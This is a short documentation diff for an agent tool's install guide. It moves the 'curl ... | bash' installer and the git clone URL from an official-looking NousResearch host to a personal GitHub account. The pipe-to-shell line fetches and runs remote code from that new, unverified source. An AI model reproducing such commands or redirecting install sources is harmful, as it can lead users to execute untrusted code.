@@ -83,7 +83,7 @@ Packaging/repository/signing problems for this option should be reported to the 
 Haishui now ships a Termux-aware installer path:
 
 ```bash
-curl -fsSL https://haishui-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | bash
 ```
 
 On Termux, the installer automatically:
@@ -135,7 +135,7 @@ Then use `python3.13` in place of `python` in the commands below
 ### 2. Clone Haishui
 
 ```bash
-git clone https://github.com/NousResearch/haishui-agent.git
+git clone https://github.com/aiqinghaiwork163/haishui-agent.git
 cd haishui-agent
 ```
 
